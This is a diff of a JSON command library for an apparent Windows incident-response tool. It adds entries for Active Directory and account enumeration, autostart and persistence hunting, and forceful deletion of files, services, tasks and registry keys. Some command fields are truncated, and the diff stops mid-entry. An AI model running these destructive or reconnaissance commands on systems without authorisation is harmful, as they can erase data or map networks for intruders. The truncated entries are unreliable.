@@ -1,49 +1,122 @@
 {
-  "version": "1.0.0",
+  "version": "3.0.0",
   "updated": "2025-10-23",
   "repository": "https://github.com/MallikarjunaKanike/terminal-assist",
-  "author": "Mallikarjuna Kanike",
-  "totalCommands": 104,
+  "author": "Mallikarjuna Kanike - SOC Team",
+  "description": "Complete consolidated DFIR command library with all commands from both sources",
+  "totalCommands": 214,
   "windows": [
     {
-      "title": "List user accounts",
-      "command": "net user",
-      "desc": "Lists all local Windows user accounts. Use this to spot unauthorized users or accounts created by attackers.",
-      "example": "net user",
-      "technique": "Valid Accounts",
-      "output": "User accounts for \\\\MY-PC:\\n-------------------------------------------------\\nAdministrator  DefaultAccount  Guest  johndoe\\nThe command completed successfully."
+      "title": "Check current domain and logon details",
+      "command": "whoami /all",
+      "desc": "Shows domain membership, group SIDs, and privileges for logged-in user.",
+      "example": "whoami /all",
+      "technique": "Account and Group Discovery",
+      "output": "User Name: CORP\\\\john.doe\\nGroup Memberships: Domain Users, RDPAccess"
     },
     {
-      "title": "Show all currently logged-in sessions (console, RDP)",
-      "command": "query user",
-      "desc": "Get info on all console and RDP sessions, including any remote use and privilege escalation points.",
-      "example": "query user",
-      "technique": "Account Discovery",
-      "output": "USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\\njohndoe               console             1    Active      none     2025-10-17 08:30"
+      "title": "Check domain, public, and private firewall profiles",
+      "command": "netsh advfirewall show allprofiles",
+      "desc": "Displays status and global settings for each network profile.",
+      "example": "netsh advfirewall show allprofiles",
+      "technique": "Firewall State Review",
+      "output": "Domain Profile: ON, Private Profile: ON, Public Profile: OFF"
     },
     {
-      "title": "Show currently logged-in users (console/RDP, alternate)",
-      "command": "qwinsta",
-      "desc": "List all user sessions on the system (console and remote).",
-      "example": "qwinsta",
-      "technique": "Valid Accounts",
-      "output": "SESSIONNAME  USERNAME  ID  STATE  TYPE  DEVICE\\n>console     admin1     0   Active  wdcon\\nrdp-tcp#1    jdoe       2   Active  rdpwd"
+      "title": "Delete a scheduled task",
+      "command": "schtasks /delete /tn \\",
+      "desc": "Removes a suspicious persistence task.",
+      "example": "schtasks /delete /tn \\",
+      "technique": "Defense Evasion",
+      "output": "SUCCESS: The scheduled task \"malicious_task\" was successfully deleted."
     },
     {
-      "title": "Log off a user session",
-      "command": "logoff <session_ID>",
-      "desc": "Terminates a specific session by ID to boot off a suspicious user.",
-      "example": "logoff 2",
-      "technique": "Account Management",
-      "output": "User session 2 has been logged off."
+      "title": "Delete file including hidden (CMD)",
+      "command": "del /F /A <filepath>",
+      "desc": "Delete file including hidden and read-only",
+      "example": "del /F /A C:\\\\malware.exe",
+      "output": "",
+      "technique": "File Deletion"
     },
     {
-      "title": "View detailed user information",
-      "command": "net user jdoe",
-      "desc": "Shows password policies, account creation details, and group memberships.",
-      "example": "net user jdoe",
-      "technique": "Account Discovery",
-      "output": "User name: jdoe\\nLocal Group Memberships: Administrators  Users\\nPassword last set: 10/15/2025"
+      "title": "Delete file including hidden (PowerShell)",
+      "command": "Remove-Item -Path <filepath> -Force",
+      "desc": "Remove file using PowerShell",
+      "example": "Remove-Item -Path C:\\\\malware.exe -Force",
+      "output": "",
+      "technique": "File Deletion"
+    },
+    {
+      "title": "Delete folder including hidden (CMD)",
+      "command": "rmdir /S /Q <folderpath>",
+      "desc": "Remove directory and all contents",
+      "example": "rmdir /S /Q C:\\\\malware_folder",
+      "output": "",
+      "technique": "File Deletion"
+    },
+    {
+      "title": "Delete folder including hidden (PowerShell)",
+      "command": "Remove-Item -Path <folderpath> -Recurse -Force",
+      "desc": "Remove folder recursively",
+      "example": "Remove-Item -Path C:\\\\malware_folder -Recurse -Force",
+      "output": "",
+      "technique": "File Deletion"
+    },
+    {
+      "title": "Delete registry key (CMD)",
+      "command": "reg delete <keypath> /v <value> /f",
+      "desc": "Delete registry value",
+      "example": "reg delete HKLM\\\\Software\\\\Malware /v malkey /f",
+      "output": "The operation completed successfully.",
+      "technique": "Defense Evasion"
+    },
+    {
+      "title": "Delete registry key (PowerShell)",
+      "command": "Remove-ItemProperty -Path <keypath> -Name <value>",
+      "desc": "Remove registry property",
+      "example": "Remove-ItemProperty -Path HKLM:\\\\Software\\\\Malware -Name malkey",
+      "output": "",
+      "technique": "Defense Evasion"
+    },
+    {
+      "title": "Delete scheduled task (CMD)",
+      "command": "schtasks /delete /tn <taskname> /f",
+      "desc": "Delete a scheduled task",
+      "example": "schtasks /delete /tn malicious_task /f",
+      "output": "SUCCESS: The scheduled task was successfully deleted.",
+      "technique": "Defense Evasion"
+    },
+    {
+      "title": "Delete scheduled task (PowerShell)",
+      "command": "Unregister-ScheduledTask -TaskName <taskname> -Confirm:$false",
+      "desc": "Remove scheduled task using PowerShell",
+      "example": "Unregister-ScheduledTask -TaskName malicious_task -Confirm:$false",
+      "output": "",
+      "technique": "Defense Evasion"
+    },
+    {
+      "title": "Delete service (CMD)",
+      "command": "sc delete <servicename>",
+      "desc": "Delete a Windows service",
+      "example": "sc delete maliciousservice",
+      "output": "[SC] DeleteService SUCCESS",
+      "technique": "Defense Evasion"
+    },
+    {
+      "title": "Delete service (PowerShell)",
+      "command": "Remove-Service -Name <servicename>",
+      "desc": "Remove service using PowerShell",
+      "example": "Remove-Service -Name maliciousservice",
+      "output": "",
+      "technique": "Defense Evasion"
+    },
+    {
+      "title": "Delete startup program (Registry)",
+      "command": "reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v <name> /f",
+      "desc": "Remove startup entry from registry",
+      "example": "reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v malware /f",
+      "output": "The operation completed successfully.",
+      "technique": "Defense Evasion"
     },
     {
       "title": "Disable a user account",
@@ -54,132 +127,100 @@
       "output": "The command completed successfully."
     },
     {
-      "title": "Find local admins (users, groups)",
-      "command": "net localgroup administrators",
-      "desc": "Lists all members (users & groups) part of the Administrators group; spot escalation or backdoor users.",
-      "example": "net localgroup administrators",
-      "technique": "Account Discovery",
-      "output": "Alias name     Administrators\\n----------------------------------------\\nAdministrator\\njohndoe\\nThe command completed successfully."
+      "title": "Disable domain user (CMD)",
+      "command": "net user <username> /active:no /domain",
+      "desc": "Disable domain user account",
+      "example": "net user jdoe /active:no /domain",
+      "output": "The command completed successfully.",
+      "technique": "Account Management"
     },
     {
-      "title": "List domain users",
-      "command": "net user /domain",
-      "desc": "Lists all domain user accounts visible to the current machine.",
-      "example": "net user /domain",
-      "technique": "Account Discovery",
-      "output": "User accounts for \\\\CORP.LOCAL:\\n-------------------------------------------------\\nAdministrator  SOCAdmin  helpdesk  john.doe"
+      "title": "Disable domain user (PowerShell)",
+      "command": "Disable-ADAccount -Identity <username>",
+      "desc": "Disable domain user using PowerShell",
+      "example": "Disable-ADAccount -Identity jdoe",
+      "output": "",
+      "technique": "Account Management"
     },
     {
-      "title": "List all domain groups",
-      "command": "net group /domain",
-      "desc": "Enumerates all Active Directory groups.",
-      "example": "net group /domain",
-      "technique": "Group Discovery",
-      "output": "Group accounts for \\\\CORP.LOCAL:\\n-------------------------------------------------\\nDomain Admins\\nEnterprise Admins\\nRDPAccess\\nFinance-AppUsers"
+      "title": "Disable local user (CMD)",
+      "command": "net user <username> /active:no",
+      "desc": "Disable a local user account",
+      "example": "net user Guest /active:no",
+      "output": "The command completed successfully.",
+      "technique": "Account Management"
     },
     {
-      "title": "View members of specific AD group",
-      "command": "net group \\",
-      "desc": "Shows members of key privileged domain groups.",
-      "example": "net group \\",
-      "technique": "Privilege Enumeration",
-      "output": "Members of group Domain Admins:\\n-------------------------------------------------\\nAdministrator\\nSOC-IRTeam"
+      "title": "Disable local user (PowerShell)",
+      "command": "Disable-LocalUser -Name <username>",
+      "desc": "Disable local user using PowerShell",
+      "example": "Disable-LocalUser -Name Guest",
+      "output": "",
+      "technique": "Account Management"
     },
     {
-      "title": "Find computer objects in domain",
-      "command": "net group \\",
-      "desc": "Lists all workstation/server objects in AD; spot unauthorized hostnames.",
-      "example": "net group \\",
-      "technique": "Network Discovery",
-      "output": "PC-01  WS-002  LAPT-007"
+      "title": "Disable user by SID (CMD)",
+      "command": "wmic useraccount where SID='<sid>' set Disabled=True",
+      "desc": "Disable local user using SID",
+      "example": "wmic useraccount where SID='S-1-5-21-xxx-500' set Disabled=True",
+      "output": "Updating property(s) of '1' instance(s)",
+      "technique": "Account Management"
     },
     {
-      "title": "Identify the domain controller",
-      "command": "nltest /dsgetdc:corp.local",
-      "desc": "Returns the domain controller the machine uses.",
-      "example": "nltest /dsgetdc:corp.local",
-      "technique": "Network Discovery",
-      "output": "DC: \\\\DC01.CORP.LOCAL Address: \\\\10.10.0.1 Site: HQ"
+      "title": "Disable user by SID (PowerShell)",
+      "command": "Disable-LocalUser -SID <sid>",
+      "desc": "Disable user by SID in PowerShell",
+      "example": "Disable-LocalUser -SID S-1-5-21-xxx-500",
+      "output": "",
+      "technique": "Account Management"
     },
     {
-      "title": "Get domain trust relationships",
-      "command": "nltest /domain_trusts",
-      "desc": "Shows trust relationships between domains for lateral movement analysis.",
-      "example": "nltest /domain_trusts",
-      "technique": "Lateral Movement Discovery",
-      "output": "Trusted domain: partnerlab.local  (Outbound trust)"
+      "title": "Display network interfaces and IPs",
+      "command": "ipconfig /all",
+      "desc": "Useful for detecting rogue adapters or DNS manipulation.",
+      "example": "ipconfig /all",
+      "technique": "Network Configuration Discovery",
+      "output": "Ethernet adapter CorpNet: IPv4 Address: 10.0.0.10"
     },
     {
-      "title": "View current Kerberos tickets",
-      "command": "klist",
-      "desc": "Shows active Kerberos tickets in user session.",
-      "example": "klist",
-      "technique": "Credential Access",
-      "output": "Client: john@CORP.LOCAL\\nServer: krbtgt/CORP.LOCAL\\nEnd Time: 10/22/2025 11:30:45"
+      "title": "Dump file/folder ACLs (permissions)",
+      "command": "icacls C:\\\\SensitiveFolder",
+      "desc": "Audit file/folder permissions for excessive, risky or exfil-targeted files.",
+      "example": "icacls C:\\\\SensitiveFolder",
+      "technique": "File and Directory Discovery",
+      "output": "C:\\\\SensitiveFolder BUILTIN\\\\Administrators:(I)(F)\\nNT AUTHORITY\\\\SYSTEM:(I)(F)\\nEveryone:(I)(OI)(CI)(RX)"
     },
     {
-      "title": "Check current domain and logon details",
-      "command": "whoami /all",
-      "desc": "Shows domain membership, group SIDs, and privileges for logged-in user.",
-      "example": "whoami /all",
-      "technique": "Account and Group Discovery",
-      "output": "User Name: CORP\\\\john.doe\\nGroup Memberships: Domain Users, RDPAccess"
+      "title": "Enable domain user (PowerShell)",
+      "command": "Enable-ADAccount -Identity <username>",
+      "desc": "Enable domain user account",
+      "example": "Enable-ADAccount -Identity jdoe",
+      "output": "",
+      "technique": "Account Management"
     },
     {
-      "title": "List all AD users (requires RSAT)",
-      "command": "Get-ADUser -Filter * | Select Name,SamAccountName,Enabled",
-      "desc": "Retrieves all users in the domain with enabled state.",
-      "example": "Get-ADUser -Filter * | Select Name,Enabled",
-      "technique": "Domain Account Enumeration",
-      "output": "John Doe True\\nSOC Admin True\\nTempUser False"
+      "title": "Enable firewall for all profiles",
+      "command": "netsh advfirewall set allprofiles state on",
+      "desc": "Ensures firewall protection is active system-wide.",
+      "example": "netsh advfirewall set allprofiles state on",
+      "technique": "Firewall Control",
+      "output": "Ok."
     },
     {
-      "title": "Get detailed info for an AD user",
-      "command": "Get-ADUser -Identity john.doe -Properties *",
-      "desc": "Shows metadata including last logon, groups, password expiration.",
-      "example": "Get-ADUser -Identity SOCAdmin -Properties DisplayName,LastLogonDate",
-      "technique": "Credential Audit",
-      "output": "DisplayName: SOC Admin\\nLastLogonDate: 10/21/2025 19:44:23"
+      "title": "Enable local user (CMD)",
+      "command": "net user <username> /active:yes",
+      "desc": "Enable a local user account",
+      "example": "net user Guest /active:yes",
+      "output": "The command completed successfully.",
+      "technique": "Account Management"
     },
     {
-      "title": "List all AD computers",
-      "command": "Get-ADComputer -Filter * | Select Name,OperatingSystem,Enabled",
-      "desc": "Identifies joined machines in AD and OS details.",
-      "example": "Get-ADComputer -Filter * | Select Name,OperatingSystem",
-      "technique": "Asset Discovery",
-      "output": "DC01  Windows Server 2022\\nLAPTOP07  Windows 11"
-    },
-    {
-      "title": "Find locked user accounts",
-      "command": "Search-ADAccount -LockedOut | Select-Object Name,LastLogonDate",
-      "desc": "Lists locked accounts possibly linked to brute-force or password-spray activity.",
-      "example": "Search-ADAccount -LockedOut",
-      "technique": "Account Lockout Detection",
-      "output": "james.wilson  Locked  LastLogonDate: 10/21/2025"
-    },
-    {
-      "title": "Show disabled accounts",
-      "command": "Search-ADAccount -AccountDisabled | Select Name",
-      "desc": "Retrieves disabled accounts to confirm access control hygiene.",
-      "example": "Search-ADAccount -AccountDisabled",
-      "technique": "Account Control Audit",
-      "output": "temp.contractor\\nservice.test"
-    },
-    {
-      "title": "List group members",
-      "command": "Get-ADGroupMember -Identity 'Domain Admins' | Select Name,SamAccountName",
-      "desc": "Shows current membership of a privileged AD group.",
-      "example": "Get-ADGroupMember -Identity 'Enterprise Admins'",
-      "technique": "Privileged Role Enumeration",
-      "output": "Administrator\\nIR-SOC-Lead"
-    },
-    {
-      "title": "Get AD trust relationships",
-      "command": "Get-ADTrust -Filter * | Select Name,Direction,TrustType",
-      "desc": "Reviews domain trust configurations for access checks.",
-      "example": "Get-ADTrust -Filter *",
-      "technique": "Trust Relationship Discovery",
-      "output": "partnerlab.local  Outbound  External"
+      "title": "Enumerate autostart registry entries",
+      "command": "reg query HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
+      "desc": "Lists programs configured to auto-start system-wide.",
+      "example": "reg query HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
+      "technique": "Registry Run Keys / Startup Folder",
+      "output": "malware.exe    REG_SZ    C:\\\\Users\\\\Public\\\\malware.exe"
     },
     {
       "title": "Enumerate organizational units (OUs)",
@@ -190,6 +231,222 @@
       "output": "Name: HR_Department\\nDN: OU=HR_Department,DC=corp,DC=local"
     },
     {
+      "title": "Find computer objects in domain",
+      "command": "net group \\",
+      "desc": "Lists all workstation/server objects in AD; spot unauthorized hostnames.",
+      "example": "net group \\",
+      "technique": "Network Discovery",
+      "output": "PC-01  WS-002  LAPT-007"
+    },
+    {
+      "title": "Find local admins (users, groups)",
+      "command": "net localgroup administrators",
+      "desc": "Lists all members (users & groups) part of the Administrators group; spot escalation or backdoor users.",
+      "example": "net localgroup administrators",
+      "technique": "Account Discovery",
+      "output": "Alias name     Administrators\\n----------------------------------------\\nAdministrator\\njohndoe\\nThe command completed successfully."
+    },
+    {
+      "title": "Find locked user accounts",
+      "command": "Search-ADAccount -LockedOut | Select-Object Name,LastLogonDate",
+      "desc": "Lists locked accounts possibly linked to brute-force or password-spray activity.",
+      "example": "Search-ADAccount -LockedOut",
+      "technique": "Account Lockout Detection",
+      "output": "james.wilson  Locked  LastLogonDate: 10/21/2025"
+    },
+    {
+      "title": "Find user logon persistence/startup programs",
+      "command": "wmic startup get caption,command",
+      "desc": "Identifies executables or commands set to run on logon; a common attacker persistence mechanism.",
+      "example": "wmic startup get caption,command",
+      "technique": "Boot or Logon Autostart Execution",
+      "output": "Caption            Command\\nOneDrive            \"C:\\\\Program Files\\\\Microsoft OneDrive\\\\OneDrive.exe\" /background\\nMaliciousUpdater    \"C:\\\\Temp\\\\evil.exe\""
+    },
+    {
+      "title": "Get AD trust relationships",
+      "command": "Get-ADTrust -Filter * | Select Name,Direction,TrustType",
+      "desc": "Reviews domain trust configurations for access checks.",
+      "example": "Get-ADTrust -Filter *",
+      "technique": "Trust Relationship Discovery",
+      "output": "partnerlab.local  Outbound  External"
+    },
+    {
+      "title": "Get GPO details",
+      "command": "Get-GPOReport -Name <gponame> -ReportType Html -Path <outputpath>",
+      "desc": "Export GPO details to HTML report",
+      "example": "Get-GPOReport -Name 'Default Domain Policy' -ReportType Html -Path C:\\\\gpo.html",
+      "output": "Report saved to C:\\\\gpo.html",
+      "technique": "Domain Policy Discovery"
+    },
+    {
+      "title": "Get IP and hostname (CMD)",
+      "command": "ipconfig /all",
+      "desc": "Display all network configuration",
+      "example": "ipconfig /all",
+      "output": "Host Name . . . . . . . : DESKTOP-ABC123\\nIPv4 Address. . . . . . : 192.168.1.10",
+      "technique": "System Network Configuration"
+    },
+    {
+      "title": "Get IP and hostname (PowerShell)",
+      "command": "Get-NetIPConfiguration; hostname",
+      "desc": "Get network config and hostname",
+      "example": "Get-NetIPConfiguration",
+      "output": "InterfaceAlias : Ethernet\\nIPv4Address    : 192.168.1.10",
+      "technique": "System Network Configuration"
+    },
+    {
+      "title": "Get detailed info for an AD user",
+      "command": "Get-ADUser -Identity john.doe -Properties *",
+      "desc": "Shows metadata including last logon, groups, password expiration.",
+      "example": "Get-ADUser -Identity SOCAdmin -Properties DisplayName,LastLogonDate",
+      "technique": "Credential Audit",
+      "output": "DisplayName: SOC Admin\\nLastLogonDate: 10/21/2025 19:44:23"
+    },
+    {
+      "title": "Get domain trust relationships",
+      "command": "nltest /domain_trusts",
+      "desc": "Shows trust relationships between domains for lateral movement analysis.",
+      "example": "nltest /domain_trusts",
+      "technique": "Lateral Movement Discovery",
+      "output": "Trusted domain: partnerlab.local  (Outbound trust)"
+    },
+    {
+      "title": "Get last 10 security events",
+      "command": "wevtutil qe Security /f:text /c:10",
+      "desc": "View the 10 most recent events in the Windows Security log—for authentication, escalation, and anomaly hunting.",
+      "example": "wevtutil qe Security /f:text /c:10",
+      "technique": "Authentication Discovery",
+      "output": "Event[0]:\\n  LogonType: 2 (Interactive)\\n  Subject: johndoe\\n  Message: An account was successfully logged on."
+    },
+    {
+      "title": "Get user SID (CMD)",
+      "command": "wmic useraccount where name='<username>' get sid",
+      "desc": "Get Security Identifier of a user using CMD",
+      "example": "wmic useraccount where name='Administrator' get sid",
+      "output": "SID\\nS-1-5-21-123456789-123456789-123456789-500",
+      "technique": "Account Discovery"
+    },
+    {
+      "title": "Get user SID (PowerShell)",
+      "command": "(Get-LocalUser -Name <username>).SID.Value",
+      "desc": "Get user SID using PowerShell",
+      "example": "(Get-LocalUser -Name Administrator).SID.Value",
+      "output": "S-1-5-21-123456789-123456789-123456789-500",
+      "technique": "Account Discovery"
+    },
+    {
+      "title": "Identify the domain controller",
+      "command": "nltest /dsgetdc:corp.local",
+      "desc": "Returns the domain controller the machine uses.",
+      "example": "nltest /dsgetdc:corp.local",
+      "technique": "Network Discovery",
+      "output": "DC: \\\\DC01.CORP.LOCAL Address: \\\\10.10.0.1 Site: HQ"
+    },
+    {
+      "title": "Kill process (CMD)",
+      "command": "taskkill /PID <pid> /F",
+      "desc": "Terminate process by PID",
+      "example": "taskkill /PID 1234 /F",
+      "output": "SUCCESS: The process with PID 1234 has been terminated.",
+      "technique": "Process Termination"
+    },
+    {
+      "title": "Kill process (PowerShell)",
+      "command": "Stop-Process -Id <pid> -Force",
+      "desc": "Stop process using PowerShell",
+      "example": "Stop-Process -Id 1234 -Force",
+      "output": "",
+      "technique": "Process Termination"
+    },
+    {
+      "title": "List GPOs",
+      "command": "Get-GPO -All",
+      "desc": "List all Group Policy Objects",
+      "example": "Get-GPO -All",
+      "output": "DisplayName      : Default Domain Policy\\nGpoStatus        : AllSettingsEnabled",
+      "technique": "Domain Policy Discovery"
+    },
+    {
+      "title": "List all AD computers",
+      "command": "Get-ADComputer -Filter * | Select Name,OperatingSystem,Enabled",
+      "desc": "Identifies joined machines in AD and OS details.",
+      "example": "Get-ADComputer -Filter * | Select Name,OperatingSystem",
+      "technique": "Asset Discovery",
+      "output": "DC01  Windows Server 2022\\nLAPTOP07  Windows 11"
+    },
+    {
+      "title": "List all AD users (requires RSAT)",
+      "command": "Get-ADUser -Filter * | Select Name,SamAccountName,Enabled",
+      "desc": "Retrieves all users in the domain with enabled state.",
+      "example": "Get-ADUser -Filter * | Select Name,Enabled",
+      "technique": "Domain Account Enumeration",
+      "output": "John Doe True\\nSOC Admin True\\nTempUser False"
+    },
+    {
+      "title": "List all domain groups",
+      "command": "net group /domain",
+      "desc": "Enumerates all Active Directory groups.",
+      "example": "net group /domain",
+      "technique": "Group Discovery",
+      "output": "Group accounts for \\\\CORP.LOCAL:\\n-------------------------------------------------\\nDomain Admins\\nEnterprise Admins\\nRDPAccess\\nFinance-AppUsers"
+    },
+    {
+      "title": "List all event log channels",
+      "command": "wevtutil el",
+      "desc": "Lists all event log sources and channels; enumerate for advanced log demand.",
+      "example": "wevtutil el",
+      "technique": "Event Log Discovery",
+      "output": "System\\nSecurity\\nApplication\\nSetup\\nWindows PowerShell\\n..."
+    },
+    {
+      "title": "List all listening ports with process info",
+      "command": "netstat -abno",
+      "desc": "Displays the executable associated with each network connection or listener.",
+      "example": "netstat -abno | more",
+      "technique": "Network Service Discovery",
+      "output": "[powershell.exe] TCP 0.0.0.0:5985 LISTENING 1234"
+    },
+    {
+      "title": "List domain users",
+      "command": "net user /domain",
+      "desc": "Lists all domain user accounts visible to the current machine.",
+      "example": "net user /domain",
+      "technique": "Account Discovery",
+      "output": "User accounts for \\\\CORP.LOCAL:\\n-------------------------------------------------\\nAdministrator  SOCAdmin  helpdesk  john.doe"
+    },
+    {
+      "title": "List files including hidden (CMD)",
+      "command": "dir /a",
+      "desc": "List all files including hidden",
+      "example": "dir /a C:\\\\Users",
+      "output": "10/23/2025  02:00 PM    <DIR>          .\\n10/23/2025  02:00 PM    <DIR>          ..",
+      "technique": "File Discovery"
+    },
+    {
+      "title": "List files including hidden (PowerShell)",
+      "command": "Get-ChildItem -Path <path> -Force",
+      "desc": "Get all files including hidden",
+      "example": "Get-ChildItem -Path C:\\\\Users -Force",
+      "output": "Mode  LastWriteTime  Length  Name\\n-a---  10/23/2025   1234   file.txt",
+      "technique": "File Discovery"
+    },
+    {
+      "title": "List group members",
+      "command": "Get-ADGroupMember -Identity 'Domain Admins' | Select Name,SamAccountName",
+      "desc": "Shows current membership of a privileged AD group.",
+      "example": "Get-ADGroupMember -Identity 'Enterprise Admins'",
+      "technique": "Privileged Role Enumeration",
+      "output": "Administrator\\nIR-SOC-Lead"
+    },
+    {
+      "title": "List local users",
+      "command": "net user",
+      "desc": "Lists all local user accounts",
+      "example": "net user",
+      "output": "Administrator  Guest  User1",
+      "technique": "Account Discovery"
+    },
+    {
       "title": "List running services",
       "command": "net start",
       "desc": "Displays services that are actively running, useful for spotting disguised malware services.",
@@ -198,12 +455,220 @@
       "output": "Windows Update\\nDefender Antivirus Service\\nEvilSvc"
     },
     {
+      "title": "List startup folder items",
+      "command": "dir \\",
+      "desc": "Displays scripts, links, or executables set to auto-launch on logon.",
+      "example": "dir C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup",
+      "technique": "Startup Folder Persistence",
+      "output": "10/22/2025  10:00 AM  evilshortcut.lnk"
+    },
+    {
+      "title": "List user accounts",
+      "command": "net user",
+      "desc": "Lists all local Windows user accounts. Use this to spot unauthorized users or accounts created by attackers.",
+      "example": "net user",
+      "technique": "Valid Accounts",
+      "output": "User accounts for \\\\MY-PC:\\n-------------------------------------------------\\nAdministrator  DefaultAccount  Guest  johndoe\\nThe command completed successfully."
+    },
+    {
+      "title": "Log off a user session",
+      "command": "logoff <session_ID>",
+      "desc": "Terminates a specific session by ID to boot off a suspicious user.",
+      "example": "logoff 2",
+      "technique": "Account Management",
+      "output": "User session 2 has been logged off."
+    },
+    {
+      "title": "Logoff user (CMD)",
+      "command": "logoff <sessionid>",
+      "desc": "Log off a user by session ID",
+      "example": "logoff 2",
+      "output": "",
+      "technique": "Account Management"
+    },
+    {
+      "title": "Logoff user (PowerShell)",
+      "command": "Invoke-WmiMethod -Path 'Win32_OperatingSystem' -Name Win32Shutdown -ArgumentList 4",
+      "desc": "Force logoff current user",
+      "example": "Invoke-WmiMethod -Path 'Win32_OperatingSystem' -Name Win32Shutdown -ArgumentList 4",
+      "output": "",
+      "technique": "Account Management"
+    },
+    {
       "title": "Query all services with state",
       "command": "sc query type= service state= all",
       "desc": "Retrieve all services and their states to detect newly installed ones.",
       "example": "sc queryex type= service",
       "technique": "Service Enumeration",
       "output": "SERVICE_NAME: EvilSvc\\n        TYPE: 10  WIN32_OWN_PROCESS\\n        STATE: 1  STOPPED"
+    },
+    {
+      "title": "Quick Defender full scan",
+      "command": "MpCmdRun -Scan -ScanType 2",
+      "desc": "Start a full antivirus scan with Windows Defender to catch malware or backdoors.",
+      "example": "MpCmdRun -Scan -ScanType 2",
+      "technique": "Malware Detection",
+      "output": "Scan started...\\nThreats found: 0"
+    },
+    {
+      "title": "Resolve hostname from IP (CMD)",
+      "command": "nslookup <ipaddress>",
+      "desc": "Resolve IP to hostname",
+      "example": "nslookup 8.8.8.8",
+      "output": "Name:    dns.google\\nAddress:  8.8.8.8",
+      "technique": "Network Discovery"
+    },
+    {
+      "title": "Resolve hostname from IP (PowerShell)",
+      "command": "Resolve-DnsName <ipaddress>",
+      "desc": "Resolve IP using PowerShell",
+      "example": "Resolve-DnsName 8.8.8.8",
+      "output": "Name           : dns.google\\nAddress        : 8.8.8.8",
+      "technique": "Network Discovery"
+    },
+    {
+      "title": "Run quick Defender scan",
+      "command": "MpCmdRun.exe -Scan -ScanType 1",
+      "desc": "Triggers a quick malware scan using Windows Defender CLI.",
+      "example": "\\",
+      "technique": "Malware Detection",
+      "output": "Scan starting...\\nNo threats detected."
+    },
+    {
+      "title": "Search registry for suspicious startup paths",
+      "command": "reg query HKLM /f evil.exe /t REG_SZ /s",
+      "desc": "Quickly locates registry persistence referencing a malicious binary.",
+      "example": "reg query HKLM /f malware.exe /s",
+      "technique": "Persistence Discovery",
+      "output": "HKEY_LOCAL_MACHINE\\\\...\\\\Run    REG_SZ    C:\\\\Windows\\\\evil.exe"
+    },
+    {
+      "title": "Show all Windows firewall profiles and rules",
+      "command": "netsh advfirewall show allprofiles",
+      "desc": "Diagnose open/closed firewall profiles and find dangerous exceptions.",
+      "example": "netsh advfirewall show allprofiles",
+      "technique": "Firewall/Network Security Discovery",
+      "output": "Domain Profile Settings:\\n----------------------------------------------------------------------\\nState                                 ON\\nAllow inbound remote admin exceptions: No\\n..."
+    },
+    {
+      "title": "Show all active network connections and owning process PID",
+      "command": "netstat -ano",
+      "desc": "Displays all open TCP/UDP ports and their owning processes. Critical for finding C2 beaconing, lateral movement, or malware listeners.",
+      "example": "netstat -ano",
+      "technique": "Network Connection Discovery",
+      "output": "Proto  Local Address          Foreign Address        State           PID\\nTCP    0.0.0.0:3389          0.0.0.0:0              LISTENING       1048\\nTCP    192.168.56.1:139      0.0.0.0:0              LISTENING       4\\nUDP    0.0.0.0:123           *:*                                   608"
+    },
+    {
+      "title": "Show all currently logged-in sessions (console, RDP)",
+      "command": "query user",
+      "desc": "Get info on all console and RDP sessions, including any remote use and privilege escalation points.",
+      "example": "query user",
+      "technique": "Account Discovery",
+      "output": "USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\\njohndoe               console             1    Active      none     2025-10-17 08:30"
+    },
+    {
+      "title": "Show all scheduled tasks/jobs",
+      "command": "schtasks /query /fo LIST /v",
+      "desc": "Enumerates all scheduled tasks, triggers, run-as credentials. Essential for persistence or unusual scheduled code detections.",
+      "example": "schtasks /query /fo LIST /v",
+      "technique": "Scheduled Task/Job",
+      "output": "TaskName:             \\\\UpdateTask\\nNext Run Time:         10/18/2025 2:00:00 AM\\nStatus:                Ready\\nLast Run Result:       0\\nScheduled Task State:  Enabled"
+    },
+    {
+      "title": "Show currently logged-in users (console/RDP, alternate)",
+      "command": "qwinsta",
+      "desc": "List all user sessions on the system (console and remote).",
+      "example": "qwinsta",
+      "technique": "Valid Accounts",
+      "output": "SESSIONNAME  USERNAME  ID  STATE  TYPE  DEVICE\\n>console     admin1     0   Active  wdcon\\nrdp-tcp#1    jdoe       2   Active  rdpwd"
+    },
+    {
+      "title": "Show disabled accounts",
+      "command": "Search-ADAccount -AccountDisabled | Select Name",
+      "desc": "Retrieves disabled accounts to confirm access control hygiene.",
+      "example": "Search-ADAccount -AccountDisabled",
+      "technique": "Account Control Audit",
+      "output": "temp.contractor\\nservice.test"
+    },
+    {
+      "title": "Show established connections (CMD)",
+      "command": "netstat -ano | findstr ESTABLISHED",
+      "desc": "Show all established connections",
+      "example": "netstat -ano | findstr ESTABLISHED",
+      "output": "TCP    192.168.1.10:443    10.0.0.5:51234    ESTABLISHED    2000",
+      "technique": "Network Connection Discovery"
+    },
+    {
+      "title": "Show established connections (PowerShell)",
+      "command": "Get-NetTCPConnection -State Established",
+      "desc": "Get established connections",
+      "example": "Get-NetTCPConnection -State Established",
+      "output": "LocalAddress  LocalPort  RemoteAddress  RemotePort  State\\n192.168.1.10  443        10.0.0.5       51234       Established",
+      "technique": "Network Connection Discovery"
+    },
+    {
+      "title": "Show file properties (CMD)",
+      "command": "wmic datafile where name='<filepath>' get *",
+      "desc": "Get detailed file properties",
+      "example": "wmic datafile where name='C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe' get *",
+      "output": "FileSize  CreationDate  LastModified\\n123456    20231015      20231015",
+      "technique": "File Discovery"
+    },
+    {
+      "title": "Show file properties (PowerShell)",
+      "command": "Get-Item <filepath> | Format-List *",
+      "desc": "Get file properties using PowerShell",
+      "example": "Get-Item C:\\\\Windows\\\\System32\\\\cmd.exe | Format-List",
+      "output": "Name          : cmd.exe\\nLength        : 123456\\nCreationTime  : 10/15/2023",
+      "technique": "File Discovery"
+    },
+    {
+      "title": "Show listening connections (CMD)",
+      "command": "netstat -ano | findstr LISTENING",
+      "desc": "Show all listening network connections",
+      "example": "netstat -ano | findstr LISTENING",
